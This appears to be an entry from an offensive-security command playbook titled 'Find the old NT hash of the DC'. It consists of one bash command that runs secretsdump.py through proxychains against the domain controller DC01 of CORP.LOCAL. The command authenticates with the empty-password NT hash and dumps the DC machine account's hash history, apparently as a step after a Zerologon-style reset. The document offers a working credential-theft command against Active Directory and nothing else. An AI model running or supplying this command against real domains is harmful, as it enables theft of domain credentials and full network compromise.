---
id: 1f64ca16-3010-4572-bbd0-0bc16448fcf1
name: Find the old NT hash of the DC
type: command
executor: bash
data: proxychains secretsdump.py -history -just-dc-user 'DC01$' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
  'CORP/DC01$@DC01.CORP.LOCAL'
output: null
created_at: '2023-04-06T03:56:02.673050+00:00'
updated_at: '2023-04-10T20:36:01.289773+00:00'
---

# Find the old NT hash of the DC

```bash
proxychains secretsdump.py -history -just-dc-user 'DC01$' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'CORP/DC01$@DC01.CORP.LOCAL'
```
